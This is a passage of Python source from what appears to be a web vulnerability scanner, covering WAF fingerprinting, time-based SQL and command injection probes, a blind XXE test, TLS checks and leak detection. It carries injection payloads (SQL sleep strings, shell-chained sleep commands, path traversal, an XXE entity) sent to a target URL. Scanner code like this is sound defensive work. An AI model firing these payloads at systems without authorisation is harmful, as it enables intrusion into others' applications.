                            "modified_time": resp.elapsed.total_seconds(),
                            "headers_sent": test.get("headers", {}),
                        },
                        confidence=0.6,
                    )
            except Exception as e:
                logger.debug(f"Differential test failed: {e}")

    def detect_waf(self):
        """
        Detect Web Application Firewalls (WAF) and identify their vendor type.

        Sends trigger payloads that WAFs typically block, then inspects
        response headers and body for known WAF signatures (Cloudflare,
        AWS WAF, ModSecurity, Akamai, Sucuri, Imperva, F5 BIG-IP).

        Returns:
            None. Findings are appended to self.findings.
        """
        logger.info("Running WAF detection")

        # Trigger payloads that WAFs typically block
        trigger_payloads = [
            "' OR 1=1--",
            "<script>alert(1)</script>",
            "../../etc/passwd",
            " UNION SELECT * FROM users--",
        ]

        waf_signatures = {
            "Cloudflare": [
                ("header", "cf-ray"),
                ("header", "cloudflare"),
                ("body", "cloudflare"),
            ],
            "AWS WAF": [
                ("header", "x-amzn-requestid"),
                ("body", "aws"),
            ],
            "ModSecurity": [
                ("body", "mod_security"),
                ("body", "not acceptable"),
                ("status", 406),
            ],
            "Akamai": [
                ("header", "akamai"),
                ("body", "akamaighost"),
            ],
            "Sucuri": [
                ("header", "x-sucuri"),
                ("body", "sucuri"),
            ],
            "Imperva": [
                ("header", "x-iinfo"),
                ("body", "incapsula"),
            ],
            "F5 BIG-IP": [
                ("header", "x-waf-event-info"),
                ("body", "f5"),
            ],
        }

        detected_wafs = set()
        waf_response = None

        for payload in trigger_payloads:
            test_url = f"{self.target_url}?test={payload}"
            resp = self._safe_request("GET", test_url)
            if not resp:
                continue

            # WAF typically blocks with 403, 406, 419, 423
            if resp.status_code in (403, 406, 419, 423, 501):
                waf_response = resp
                break

        if not waf_response:
            # Also check normal response for WAF headers
            resp = self._safe_request("GET", self.target_url)
            if resp:
                waf_response = resp

        if not waf_response:
            return

        # Check signatures
        headers_str = str(waf_response.headers).lower()
        body_str = waf_response.text.lower()

        for waf_name, signatures in waf_signatures.items():
            for sig_type, sig_value in signatures:
                sig_value_lower = str(sig_value).lower()
                if sig_type == "header" and sig_value_lower in headers_str or sig_type == "body" and sig_value_lower in body_str or sig_type == "status" and waf_response.status_code == sig_value:
                    detected_wafs.add(waf_name)

        if detected_wafs:
            self._add_finding(
                finding_type="WAF_DETECTED",
                severity="INFO",
                endpoint=self.target_url,
                evidence={
                    "waf_types": list(detected_wafs),
                    "trigger_status": waf_response.status_code,
                    "response_headers": dict(waf_response.headers),
                },
                confidence=0.8,
            )
        elif waf_response.status_code in (403, 406, 419, 423):
            self._add_finding(
                finding_type="WAF_DETECTED",
                severity="INFO",
                endpoint=self.target_url,
                evidence={
                    "waf_types": ["Unknown"],
                    "trigger_status": waf_response.status_code,
                    "message": "Blocking behavior detected but WAF type not identified",
                },
                confidence=0.5,
            )

    def time_based_detection(self):
        """
        Detect time-based vulnerabilities using deliberate timing delays.

        Tests for blind SQL injection (MySQL, PostgreSQL, MSSQL, SQLite,
        Oracle), command injection, and blind XXE by measuring whether
        the response time exceeds a threshold after injecting delay
        payloads.

        Returns:
            None. Findings are appended to self.findings.
        """
        logger.info("Running time-based vulnerability detection")

        delay_seconds = 5
        threshold = delay_seconds * 0.8  # Allow 80% of delay to account for variance

        # SQL injection time-based payloads
        sqli_payloads = [
            ("mysql", f"' OR SLEEP({delay_seconds})--"),
            ("mysql_alt", f"'; SELECT SLEEP({delay_seconds})--"),
            ("postgres", f"'; SELECT pg_sleep({delay_seconds})--"),
            ("mssql", f"'; WAITFOR DELAY '0:0:{delay_seconds}'--"),
            ("sqlite", f"' AND randomblob({delay_seconds}00000000)--"),
            ("oracle", f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{delay_seconds})--"),
        ]

        # Command injection time-based payloads
        cmdi_payloads = [
            ("; sleep", f"; sleep {delay_seconds}"),
            ("| sleep", f"| sleep {delay_seconds}"),
            ("&& sleep", f"&& sleep {delay_seconds}"),
            ("`sleep", f"`sleep {delay_seconds}`"),
            ("$(sleep", f"$(sleep {delay_seconds})"),
        ]

        # Test SQL injection
        for db_type, payload in sqli_payloads:
            test_url = f"{self.target_url}?id={payload}"
            start = time.time()
            self._safe_request("GET", test_url)
            elapsed = time.time() - start

            if elapsed >= threshold:
                self._add_finding(
                    finding_type="TIME_BASED_SQL_INJECTION",
                    severity="HIGH",
                    endpoint=test_url,
                    evidence={
                        "db_type_tested": db_type,
                        "payload": payload,
                        "response_time_seconds": elapsed,
                        "threshold_seconds": threshold,
                        "message": f"Response delayed by {elapsed:.1f}s suggests time-based SQL injection",
                    },
                    confidence=0.7,
                )
                break  # Found one, likely enough

        # Test command injection
        for cmd_type, payload in cmdi_payloads:
            test_url = f"{self.target_url}?input={payload}"
            start = time.time()
            self._safe_request("GET", test_url)
            elapsed = time.time() - start

            if elapsed >= threshold:
                self._add_finding(
                    finding_type="TIME_BASED_COMMAND_INJECTION",
                    severity="HIGH",
                    endpoint=test_url,
                    evidence={
                        "payload_type": cmd_type,
                        "payload": payload,
                        "response_time_seconds": elapsed,
                        "threshold_seconds": threshold,
                        "message": f"Response delayed by {elapsed:.1f}s suggests command injection",
                    },
                    confidence=0.7,
                )
                break

        # Blind XXE time-based test
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "http://127.0.0.1:9999/xxe">
        ]>
        <foo>&xxe;</foo>"""

        start = time.time()
        self._safe_request(
            "POST",
            self.target_url,
            data=xxe_payload,
            headers={"Content-Type": "application/xml"},
        )
        elapsed = time.time() - start

        if elapsed >= threshold:
            self._add_finding(
                finding_type="BLIND_XXE",
                severity="HIGH",
                endpoint=self.target_url,
                evidence={
                    "payload": xxe_payload[:100],
                    "response_time_seconds": elapsed,
                    "threshold_seconds": threshold,
                    "message": "Long response time may indicate OOB XXE resolution attempt",
                },
                confidence=0.4,
            )

    def ssl_verify(self):
        """
        Verify SSL/TLS certificate and server-side configuration.

        Checks for HTTPS usage, certificate expiry, self-signed certificates,
        weak TLS versions (SSLv3, TLSv1, TLSv1.1), and weak cipher suites.

        Returns:
            None. Findings are appended to self.findings.
        """
        logger.info("Running SSL/TLS verification")

        import ssl

        parsed = urlparse(self.target_url)
        hostname = parsed.hostname
        port = parsed.port or 443

        if not hostname:
            return

        if parsed.scheme != "https":
            self._add_finding(
                finding_type="NO_HTTPS",
                severity="HIGH",
                endpoint=self.target_url,
                evidence={
                    "scheme": parsed.scheme,
                    "message": "Target does not use HTTPS",
                },
                confidence=0.95,
            )
            return

        context = ssl.create_default_context()
        sock = None
        ssock = None

        try:
            sock = socket.create_connection((hostname, port), timeout=self.timeout)
            ssock = context.wrap_socket(sock, server_hostname=hostname)

            try:
                cert = ssock.getpeercert()
            except (ValueError, ssl.SSLError):
                cert = None
            cipher = ssock.cipher()
            version = ssock.version()

            # Check certificate expiry
            if cert:
                not_after = cert.get("notAfter")
                if not_after:
                    expiry = ssl.cert_time_to_seconds(not_after)
                    if expiry < time.time():
                        self._add_finding(
                            finding_type="EXPIRED_SSL_CERTIFICATE",
                            severity="HIGH",
                            endpoint=f"{hostname}:{port}",
                            evidence={
                                "expiry_date": not_after,
                                "subject": cert.get("subject"),
                            },
                            confidence=0.95,
                        )

                # Check if self-signed
                issuer = cert.get("issuer")
                subject = cert.get("subject")
                if issuer == subject:
                    self._add_finding(
                        finding_type="SELF_SIGNED_CERTIFICATE",
                        severity="MEDIUM",
                        endpoint=f"{hostname}:{port}",
                        evidence={
                            "issuer": issuer,
                            "subject": subject,
                        },
                        confidence=0.9,
                    )

            # Check TLS version
            weak_versions = ["SSLv3", "TLSv1", "TLSv1.1"]
            if version in weak_versions:
                self._add_finding(
                    finding_type="WEAK_TLS_VERSION",
                    severity="HIGH",
                    endpoint=f"{hostname}:{port}",
                    evidence={
                        "tls_version": version,
                        "message": f"{version} is deprecated and insecure",
                    },
                    confidence=0.95,
                )

            # Check cipher strength
            if cipher:
                cipher_name = cipher[0]
                weak_ciphers = [
                    "RC4", "DES", "3DES", "MD5", "NULL",
                    "EXPORT", "anon", "CBC"
                ]
                if any(wc in cipher_name for wc in weak_ciphers):
                    self._add_finding(
                        finding_type="WEAK_SSL_CIPHER",
                        severity="HIGH",
                        endpoint=f"{hostname}:{port}",
                        evidence={
                            "cipher": cipher_name,
                            "message": f"Weak cipher detected: {cipher_name}",
                        },
                        confidence=0.85,
                    )

        except ssl.SSLError as e:
            self._add_finding(
                finding_type="SSL_ERROR",
                severity="MEDIUM",
                endpoint=self.target_url,
                evidence={
                    "error": str(e),
                    "message": "SSL/TLS handshake failed",
                },
                confidence=0.8,
            )
        except OSError as e:
            logger.debug(f"SSL verification socket error: {e}")
        except Exception as e:
            logger.debug(f"SSL verification error: {e}")
        finally:
            if ssock:
                with contextlib.suppress(Exception):
                    ssock.close()
            if sock:
                with contextlib.suppress(Exception):
                    sock.close()

    def response_analysis(self):
        """
        Analyze HTTP responses for information leakage and debug exposure.

        Detects server version headers, framework leaks (X-Powered-By,
        X-AspNet-Version), stack traces, internal IP addresses, email
        addresses, and debug mode indicators in response content.

        Returns:
            None. Findings are appended to self.findings.
        """
        logger.info("Running response analysis")

        resp = self._safe_request("GET", self.target_url)
        if not resp:
            return

        # Server information disclosure
        server_header = resp.headers.get("Server", "")
        powered_by = resp.headers.get("X-Powered-By", "")
        asp_version = resp.headers.get("X-AspNet-Version", "")
        asp_mvc = resp.headers.get("X-AspNetMvc-Version", "")

        if server_header:
            self._add_finding(
                finding_type="SERVER_INFO_DISCLOSURE",
                severity="LOW",
                endpoint=self.target_url,
                evidence={
                    "header": "Server",
                    "value": server_header,
                    "message": "Server software version exposed",
                },
                confidence=0.9,
            )

        if powered_by:
            self._add_finding(
                finding_type="FRAMEWORK_VERSION_LEAK",
                severity="LOW",
                endpoint=self.target_url,
                evidence={
                    "header": "X-Powered-By",
                    "value": powered_by,
                    "message": "Framework version exposed",
                },
                confidence=0.9,
            )

        if asp_version or asp_mvc:
            self._add_finding(
                finding_type="FRAMEWORK_VERSION_LEAK",
                severity="LOW",
                endpoint=self.target_url,
                evidence={
                    "headers": {
                        "X-AspNet-Version": asp_version,
                        "X-AspNetMvc-Version": asp_mvc,
                    },
                    "message": "ASP.NET version information exposed",
                },
                confidence=0.9,
            )

        # Stack trace detection
        stack_patterns = [
            r"Traceback \(most recent call last\)",
            r"at [\w\.]+\.[\w]+\([^)]*\)",
            r"Exception in thread",
            r"Fatal error:",
            r"PHP Stack trace:",
            r"in /[\w/]+ on line \d+",
        ]

        for pattern in stack_patterns:
            if re.search(pattern, resp.text, re.IGNORECASE):
                match = re.search(pattern, resp.text, re.IGNORECASE)
                snippet = resp.text[max(0, match.start()-100):match.end()+200]
                self._add_finding(
                    finding_type="STACK_TRACE_EXPOSURE",
                    severity="MEDIUM",
                    endpoint=self.target_url,
                    evidence={
                        "pattern_matched": pattern,
                        "snippet": snippet,
                        "message": "Stack trace or debug information exposed in response",
                    },
                    confidence=0.8,
                )
                break

        # Internal IP disclosure
        internal_ip_pattern = r"(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})"
        internal_ips = re.findall(internal_ip_pattern, resp.text)
        if internal_ips:
            self._add_finding(
                finding_type="INTERNAL_IP_DISCLOSURE",
                severity="LOW",
                endpoint=self.target_url,
                evidence={
                    "internal_ips_found": list(set(internal_ips)),
                    "message": "Internal IP addresses exposed in response",
                },
                confidence=0.8,
            )

        # Email address disclosure
        email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        emails = re.findall(email_pattern, resp.text)
        if emails:
            self._add_finding(
                finding_type="EMAIL_DISCLOSURE",
                severity="INFO",
                endpoint=self.target_url,
                evidence={
                    "emails_found": list(set(emails))[:10],
                    "count": len(set(emails)),
                    "message": "Email addresses exposed in response",
                },
                confidence=0.7,
            )

        # Debug mode detection
        debug_indicators = [
            "DEBUG = True",
            "debug mode",
            "debug toolbar",
            "flask-debug",
            "django-debug",
        ]
        for indicator in debug_indicators:
            if indicator.lower() in resp.text.lower():
                self._add_finding(
                    finding_type="DEBUG_MODE_ENABLED",
                    severity="MEDIUM",
                    endpoint=self.target_url,
                    evidence={
                        "indicator": indicator,
                        "message": "Debug mode may be enabled",
                    },
                    confidence=0.7,
                )
                break
